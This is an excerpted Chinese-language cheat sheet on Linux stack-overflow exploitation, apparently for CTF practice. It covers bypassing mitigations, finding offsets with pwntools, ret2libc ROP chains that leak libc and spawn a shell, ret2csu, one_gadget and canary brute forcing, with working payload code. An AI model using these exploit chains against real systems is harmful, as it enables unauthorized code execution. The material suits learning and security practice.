...
| `Canary found` | 栈溢出会被检测 | 先 leak canary 或绕（fork 服务/格式化字符串） |
| `PIE enabled` | .text 基址随机 | 必须 leak 一个代码地址 |
| `No PIE` | .text 固定 | gadget 地址写死 |
| `Full RELRO` | GOT 不可写 | 放弃改 GOT，走 ret2libc / one_gadget |
| `Partial RELRO` | GOT 可写 | 可以改 GOT 表 |
| `FORTIFY` | 部分 libc 函数被换成 `_chk` 版本 | `read_chk` 仍可溢出，`strcpy_chk` 不行 |
...
# 3. 从 core dump 取 RSP 上的值反推偏移
core = p.corefile
fault = core.fault_addr  # 或 core.rsp 指向的 8 字节
offset = cyclic_find(fault & 0xffffffff)      # 32-bit
...
| ARM64 | x0-x7, 栈 | x0 | 类似 SysV，对齐更严格 |
...
OFFSET = 0x48                      # cyclic 实测
pop_rdi = 0x0000000000401383      # ROPgadget --only "pop|ret" | grep rdi
ret     = 0x000000000040101a      # 栈对齐用

payload  = b'A' * OFFSET
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])   # puts 打印自己的真实地址
payload += p64(elf.plt['puts'])
payload += p64(elf.sym['main'])   # 回到 main 复用溢出做第二轮

p.sendlineafter(b'> ', payload)

# 收 leak：用锚字符串，别用 sleep
p.recvuntil(b'bye\n')
...
payload  = b'A' * OFFSET
payload += p64(ret)        # 关键：补 16-byte 对齐
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
...
原因：libc 的 system → do_system → 内部某处 movaps xmm0, [rsp]
      要求 rsp 16-byte 对齐
失败：ROP 链跳进 system 时 rsp 末位是 0x8 而非 0x0
修复：ROP 链里插一个 ret gadget（消耗 8 字节，rsp 重新对齐）
```

## ret2csu（万能 gadget）

二进制里没有 `pop rdx; ret` 这类第三参数 gadget 时，用 `__libc_csu_init` 的固定结构（glibc < 2.34 静态链接的程序里都有）。
...
def csu(rdi, rsi, rdx, call_target):
    p  = p64(csu_pop)
    p += p64(0)              # rbx = 0
    p += p64(1)              # rbp = 1（使 cmp rbx,rbp 通过 → rbx+1 == rbp）
...
适用：bss 里写一个函数指针，再用 csu 调用它，常用于 `read(0, bss, 0x100)` 阶段后跳 bss 执行 ROP。
...
**坑**：one_gadget 在部分 libc 版本（2.34+）约束极难满足，老老实实 ret2libc 更稳。
...
# 用 leak 出的 puts 和 read 地址（取后 3 位）反查
...
- **canary 在 fork 子进程里不变** — forking server 可以逐字节爆破（1/256 × 7 字节）
